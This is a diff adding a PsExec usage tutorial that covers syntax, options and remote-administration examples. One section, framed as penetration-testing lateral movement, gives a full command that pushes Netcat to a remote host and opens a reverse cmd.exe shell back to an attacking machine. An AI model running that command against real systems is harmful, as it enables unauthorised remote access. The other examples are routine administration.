@@ -1,0 +1,92 @@
+PsExec is a powerful command-line tool from Microsoft's Sysinternals suite that allows you to execute processes on remote systems.
+Download PsExec from the official Sysinternals page.
+Extract the PsExec.exe file and place it in a directory included in your system's PATH (e.g., C:\Windows\System32) or run it directly from the extracted folder.
+
+2. Basic Syntax
+The general syntax for PsExec is:
+
+psexec \\<target> [options] <command> [arguments]
+\\<target>: The hostname or IP address of the remote system.
+<command>: The command or program you want to execute.
+[options]: Additional flags to control execution.
+
+------------------------------------------------------------------------------------
+
+
+6. Practical Example: Lateral Movement (Penetration Testing)
+Execute a reverse shell payload on a remote system (assuming you already have credentials):
+
+cmd
+Copy code
+psexec \\192.168.1.100 -u Administrator -p Password123 -c C:\path\to\nc.exe -d -e cmd.exe 192.168.1.50 4444
+This uses Netcat (nc.exe) to create a reverse shell back to your attacking machine.
+
+--------------------------------------------------------------------------------------------------------------
+Option	Description
+-u	Specifies the username for authentication.
+-p	Specifies the password for authentication.
+-s	Runs the process as the SYSTEM account.
+-i	Runs the process interactively (visible to the logged-in user).
+-d	Doesn't wait for the process to terminate (runs in the background).
+-c	Copies the specified executable to the remote system.
+-v	Verifies the copied file.
+-h	Runs the command with elevated privileges.
+3. Common Use Cases and Examples
+
+---------------------------------------------------------------------------
+
+Opening a Remote Command Prompt
+Start an interactive command prompt session on the remote machine:
+
+psexec \\192.168.1.100 cmd.exe
+
+ Specifying Credentials
+Use the -u (username) and -p (password) options to authenticate on the target system:
+psexec \\192.168.1.100 -u Administrator -p Password123 cmd.exe
+
+--------------------------------------------------------------------------
+
+Example: Install example.msi on the target machine:
+
+psexec \\192.168.1.100 msiexec /i C:\path\to\example.msi /quiet
+-----------------------------------------------------------------
+
+Copying Files to a Remote System
+Use the -c option to copy a file to the remote system before executing it:
+psexec \\192.168.1.100 -c C:\path\to\script.bat
+-----------------------------------------------
+
+Running Commands as SYSTEM
+Use the -s option to run the command as the SYSTEM account:
+psexec \\192.168.1.100 -s cmd
+
+--------------------------------------------
+Rebooting a Remote Machine
+psexec \\192.168.1.100 shutdown -r -t 0
+
+Running Commands in the Background
+Use the -d option to run the command without waiting for it to finish:
+psexec \\192.168.1.100 -d notepad.exe
+--------------------------------------------
+
+Running Commands on Multiple Machines
+You can specify multiple targets by separating them with commas or using a text file:
+psexec @targets.txt ipconfig
+Where targets.txt contains:
+
+Copy code
+192.168.1.100
+192.168.1.101
+192.168.1.102
+---------------------------------------------
+Checking Remote System Information
+Example: Retrieve the remote system's hostname:
+
+psexec \\192.168.1.100 hostname
+
+
+
+Security Considerations
+Credentials in Command Line: Avoid passing passwords in plaintext on the command line. Use secure methods, such as encrypted communication or secured environments.
+Windows Firewall: Ensure the remote system's firewall allows PsExec (requires file and printer sharing or TCP port 445).
+Antivirus Alerts: Some antivirus tools flag PsExec as a potentially unwanted application (PUA) because it can be abused by attackers.
